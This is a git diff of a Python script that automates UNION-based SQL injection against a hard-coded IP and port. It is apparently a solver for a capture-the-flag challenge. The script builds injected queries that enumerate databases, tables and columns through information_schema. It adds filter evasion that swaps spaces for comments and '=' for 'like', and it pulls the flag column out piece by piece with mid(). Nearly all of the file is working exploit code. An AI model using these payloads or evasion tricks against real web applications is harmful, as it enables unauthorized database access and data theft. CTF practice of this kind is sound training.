@@ -5,20 +5,26 @@ import re
 
 from requests_html import AsyncHTMLSession, HTMLSession
 
-url = 'http://1.14.71.254:28076/?wllm='
+url = 'http://1.14.71.254:28038/?wllm='
 # flag_success = '欢迎'
-failed_text = 'error'
+failed_text = '非法'
 
 fuzz_column_num = "-1' union select {}%23"
+payload_base = "-1' UNion {} %23"
 payload_database = "-1' UNion {} %23"
-payload_table    = "-1' UNion {} from information_schema.tables where table_schema=database()%23"
-payload_column   = "-1' UNion {} from information_schema.columns where table_name='{}'%23"
+payload_table    = "(select group_concat(table_name) from information_schema.tables where table_schema like database())"
+# payload_table    = "-1' UNion {} from information_schema.tables where table_schema=database()%23"
+# payload_column   = "-1' UNion {} from information_schema.columns where table_name='{}'%23"
+''
+payload_column   = "(select group_concat(column_name) from information_schema.columns where table_name='{}')"
 payload_data     = "-1' UNion {} from {}%23"
+payload_data_right     = "-1' UNion {} from {}%23"
 
+fuzz = {
+    "=": " like ",
+    " ": "/**/",
+}
 # key = "wllm"
-# fuzz = {
-#     ' ': '/**/'
-# }
 
 start_time = time.time()
 session = HTMLSession()
@@ -50,15 +56,18 @@ def get_cnum(payload):
     open('sql_column_num', 'w').write(select)
     return select
 
-
+import re
+from re import escape
 def go(title, payload):
     if fz := globals().get('fuzz', ''):
         for k, v in fz.items():
-            payload = payload.replace(k, v)
+            payload = re.sub(escape(k), escape(v), payload, flags=re.IGNORECASE)
+            payload = payload.replace('\\', '')
     if title == 'column_num':
         return get_cnum(payload)
 
-    res = session.get(url + payload)
+    url_payload = url + payload
+    res = session.get(url_payload)
     print(title, ' = ', res.text)
 
 
@@ -67,10 +76,13 @@ def init(select):
     global payload_table
     global payload_column
     global payload_data
+    global payload_data_right
     payload_database = payload_database.format(select).format('database()')
-    payload_table = payload_table.format(select).format("group_concat(table_name)")
-    payload_column = payload_column.format(select, '{}').format('group_concat(column_name)', '{}')
+    payload_table = payload_base.format(select).format(payload_table)
+    payload_column = payload_base.format(select).format(payload_column)
     payload_data = payload_data.format(select, '{}')
+    # payload_data_right = payload_data_right.format(select, '{}').format('mid({},16,25)', {})
+    payload_data_right = payload_data_right.format(select, '{}').format('mid({},26,25)', {})
 
 
 
@@ -78,13 +90,14 @@ def init(select):
 
 
 if __name__ == '__main__':
-    table_name = 'flag'
+    table_name = 'LTLT_flag'
     column_name = 'flag'
 
     select = go('column_num', fuzz_column_num)
     init(select)
     # go('database', payload_database)  # 'kanwolongxia'
-    go('table', payload_table)  # 'loflag'
+    # go('table', payload_table)  # 'loflag'
     # go('column', payload_column.format(table_name))  # Id,flaglo
-    go('data', payload_data.format(column_name, table_name))
+    # go('data', payload_data.format(column_name, table_name))
+    go('data', payload_data_right.format(column_name, table_name))
     print("--- %s seconds ---" % (time.time() - start_time))
